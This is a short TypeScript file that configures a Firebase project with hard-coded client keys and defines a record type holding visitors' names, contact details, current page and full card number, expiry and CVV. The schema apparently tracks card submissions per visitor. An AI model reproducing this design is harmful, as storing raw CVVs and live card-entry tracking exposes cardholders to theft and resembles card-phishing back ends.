import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyDJ-0cptQFiTZNKOD3YrHmHIjVN9Rk1jSs",
  authDomain: "clinte-25027.firebaseapp.com",
  databaseURL: "https://clinte-25027-default-rtdb.firebaseio.com",
  projectId: "clinte-25027",
  storageBucket: "clinte-25027.firebasestorage.app",
  messagingSenderId: "164388154350",
  appId: "1:164388154350:web:33d2bc724edfe4e0dc3cff",
  measurementId: "G-XJVRTMJHEV"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
